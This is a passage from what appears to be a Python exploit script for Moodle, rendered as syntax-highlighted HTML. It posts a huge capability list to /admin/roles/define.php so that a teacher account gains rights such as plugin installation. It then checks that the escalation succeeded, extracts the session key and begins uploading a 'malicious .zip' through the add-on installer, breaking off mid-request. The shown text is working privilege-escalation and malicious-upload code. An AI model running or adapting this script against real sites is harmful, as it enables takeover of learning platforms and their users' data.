class="string">&#x27;mod/feedback:deletetemplate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:edititems&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:mapcourse&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:receivemail&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:viewanalysepage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/feedback:viewreports&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/folder:managefiles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/folder:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:addnews&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:addquestion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:allowforcesubscribe&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:canoverridecutoff&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:canoverridediscussionlock&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:canposttomygroups&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:cantogglefavourite&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:createattachment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:deleteanypost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:deleteownpost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:editanypost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:exportdiscussion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:exportforum&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:exportownpost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:exportpost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:grade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:managesubscriptions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:movediscussions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:pindiscussions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:postprivatereply&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:postwithoutthrottling&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:rate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:readprivatereplies&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:replynews&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:replypost&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:splitdiscussions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:startdiscussion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewallratings&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewanyrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewdiscussion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewhiddentimedposts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewqandawithoutposting&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/forum:viewsubscribers&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:approve&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:comment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:export&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:exportentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:exportownentry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:import&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:managecategories&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:managecomments&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:manageentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:rate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:viewallratings&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:viewanyrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:viewrating&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/glossary:write&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/h5pactivity:reviewattempts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/h5pactivity:submit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/h5pactivity:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/imscp:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/label:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:grade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:manageoverrides&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lesson:viewreports&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:admin&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/lti:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/page:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:attempt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:deleteattempts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:emailconfirmsubmission&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:emailnotifysubmission&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:emailwarnoverdue&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:grade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:ignoretimelimits&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:manageoverrides&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:preview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:regrade&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:reviewmyattempts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/quiz:viewreports&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/resource:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:deleteownresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:deleteresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:savetrack&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:skipview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:viewreport&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/scorm:viewscores&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/survey:download&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/survey:participate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/survey:readresponses&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/url:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:createpage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:editcomment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:editpage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:managecomment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:managefiles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:managewiki&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:overridelock&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:viewcomment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/wiki:viewpage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:allocate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:deletesubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:editdimensions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:exportsubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:ignoredeadlines&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:manageexamples&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:overridegrades&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:peerassess&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:publishsubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:submit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:switchphase&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewallassessments&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewallsubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewauthornames&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewauthorpublished&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewpublishedsubmissions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;mod/workshop:viewreviewernames&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/backup:backupactivity&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:coursecompetencyconfigure&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:activityvisibility&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:ignoreavailabilityrestrictions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:manageactivities&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:togglecompletion&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:viewhiddenactivities&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/h5p:deploy&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/h5p:setdisplayoptions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/h5p:updatelibraries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:accessallgroups&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:managecontextlocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:trustcontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:viewanonymousevents&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:viewfullnames&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:viewuseridentity&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quiz/grading:viewidnumber&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quiz/grading:viewstudentnames&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quiz/statistics:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:bypassseb&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_filemanager_sebconfigfile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_activateurlfiltering&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_allowedbrowserexamkeys&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_allowreloadinexam&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_allowspellchecking&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_allowuserquitseb&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_enableaudiocontrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_expressionsallowed&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_expressionsblocked&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_filterembeddedcontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_linkquitseb&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_muteonstartup&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_quitpassword&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_regexallowed&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_regexblocked&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_requiresafeexambrowser&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showkeyboardlayout&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showreloadbutton&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showsebdownloadlink&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showsebtaskbar&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showtime&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_showwificontrol&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_templateid&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:manage_seb_userconfirmquit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/areafiles:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/boxnet:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/contentbank:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/coursefiles:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/dropbox:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/equella:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/filesystem:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/flickr:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/flickr_public:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/googledocs:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/local:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/merlot:view&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;repository/nextcloud:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/onedrive:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/picasa:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/recent:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/s3:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/skydrive:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/upload:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/url:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/user:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/webdav:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/wikimedia:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/youtube:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/activity_modules:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/activity_results:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/admin_bookmarks:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/badges:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/blog_menu:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/blog_recent:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/blog_tags:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/calendar_month:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/calendar_upcoming:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/comments:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/completionstatus:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/course_list:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/course_summary:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/feedback:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/globalsearch:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/glossary_random:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/html:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/login:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/mentees:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/mnet_hosts:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/myprofile:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/navigation:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/news_items:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/online_users:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/online_users:viewlist&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/private_files:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/quiz_results:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/recent_activity:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/rss_client:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/rss_client:manageanyfeeds&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/rss_client:manageownfeeds&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/search_forums:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/section_links:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/selfcompletion:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/settings:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/site_main_menu:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/social_activities:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/tag_flickr:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/tag_youtube:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/tags:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/block:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/block:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:manageblocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;savechanges&#x27;</span>,<span class="string">&#x27;Save changes&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    r = session.post(url + <span class="string">&#x27;/admin/roles/define.php&#x27;</span>, params=data_get, data=data_post)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Above we modify description field, so, if script find that description on site, we are good.</span></span><br><span class="line">    <span class="keyword">if</span> random_desc <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        p6.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nTrouble updating fields\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = session.get(url + <span class="string">&#x27;/admin/search.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Install plugins&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            p6.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">            <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nModified fields but the options to install plugins have not been enabled.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(Color.RED + <span class="string">&quot;- (This is weird, sometimes he does it, sometimes he doesn&#x27;t!!) Try again.\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    sess_key = re.findall(<span class="string">r&#x27;&quot;sesskey&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    p6.success(Color.YELLOW + <span class="string">&quot;✓&quot;</span> + Color.END)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session, sess_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zipb64_up</span>(<span class="params">session, url, sess_key, teacher_user, course_id</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Doing upload of zip file as base64 binary data</span></span><br><span class="line"><span class="string">        * https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    p7 = log.progress(<span class="string">&quot;Uploading malicious &quot;</span> + Color.BLUE + <span class="string">&quot;.zip&quot;</span> + Color.END + <span class="string">&quot; file&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/admin/tool/installaddon/index.php&#x27;</span>)</span><br><span class="line">    zipfile_id = re.findall(<span class="string">r&#x27;name=&quot;zipfile&quot; id=&quot;id_zipfile&quot; value=&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    client_id = re.findall(<span class="string">r&#x27;&quot;client_id&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Upupup</span></span><br><span class="line">    data_get = &#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;upload&quot;</span>&#125;</span><br><span class="line">    data_post = &#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;author&quot;</span> : teacher_user,</span><br><span class="line">        <span class="string">&quot;license&quot;</span> : <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">        <span class="string">&quot;itemid&quot;</span> : [zipfile_id, zipfile_id],</span><br><span class="line">        <span class="string">&quot;accepted_types[]&quot;</span> : [<span class="string">&quot;.zip&quot;</span>,<span class="string">&quot;.zip&quot;</span>],</span><br><span class="line">        <span class="string">&quot;repo_id&quot;</span> : course_id,</span><br><span class="line">        <span class="string">&quot;p&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;page&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;env&quot;</span> : <span class="string">&quot;filepicker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sesskey&quot;</span> : sess_key,</span><br><span class="line">        <span class="string">&quot;client_id&quot;</span> : client_id,</span><br><span class="line">        <span class="string">&quot;maxbytes&quot;</span> : 